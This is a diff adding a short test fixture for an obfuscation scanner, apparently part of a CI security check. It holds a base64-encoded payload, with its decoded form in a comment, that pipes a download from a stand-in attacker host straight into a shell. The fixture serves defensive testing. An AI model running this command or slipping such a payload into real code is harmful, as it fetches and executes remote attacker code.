@@ -1,0 +1,8 @@
+# VALIDATION FIXTURE — do not execute. Used to confirm the obfuscation scan
+# catches an encoded external-download payload. The base64 blob below decodes to:
+#   curl http://evil.example/sh | sh
+#
+# Paste the PAYLOAD line into a source file in a throwaway PR; the obfuscation
+# scan job must fail and decode it as shown.
+
+PAYLOAD="Y3VybCBodHRwOi8vZXZpbC5leGFtcGxlL3NoIHwgc2g="
